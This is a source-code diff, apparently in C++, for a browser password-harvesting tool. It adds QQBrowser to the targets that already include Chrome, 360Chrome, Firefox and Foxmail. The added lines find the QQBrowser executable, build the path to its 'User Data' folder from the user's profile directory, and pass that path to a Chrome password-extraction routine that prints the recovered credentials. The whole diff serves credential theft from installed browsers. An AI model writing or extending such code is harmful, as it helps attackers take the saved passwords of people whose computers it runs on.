@@ -10,6 +10,7 @@
 extern "C" int Get_Firefox_Passwd();
 const char *_360CHROME_EXE = "360chrome.exe";
 const char *CHROME_EXE = "chrome.exe";
+const char *QQBROWSER_EXE = "QQBrowser.exe";
 const char *FOXMAIL_EXE = "Foxmail.exe";
 
 
@@ -106,11 +107,15 @@ int main(int argc, char* argv[]){
     str.n = 0;
     char* chrome_path = get_exe_path(CHROME_EXE);
     char* _360chrome_path = get_exe_path(_360CHROME_EXE);
+    char* qqbrowser_path = get_exe_path(QQBROWSER_EXE);
     char *_foxmail_path = get_foxmail_path();
+
+    char* user_profile = getenv("USERPROFILE");
     // std::cout << "foxmail: " << _foxmail_path << std::endl;
 
     char _360chrome_data_path[255];
     char foxmail_path[255];
+    char qq_data_path[255];
 
     if (chrome_path != NULL){
         printf("====================\nGoogle Chrome ->\n");
@@ -127,6 +132,16 @@ int main(int argc, char* argv[]){
         Get_Chrome_Passwd(str);
         printf("\n\n");
     }
+
+    if (qqbrowser_path != NULL){
+        printf("====================\nQQBrowser ->\n");
+        sprintf(qq_data_path, "%s\\AppData\\Local\\Tencent\\QQBrowser\\User Data", user_profile);
+        str.p = qq_data_path;
+        str.n = strlen(qq_data_path);
+        Get_Chrome_Passwd(str);
+        printf("\n\n");
+    }
+
 
     printf("====================\nFirefox ->\n");
     Get_Firefox_Passwd();
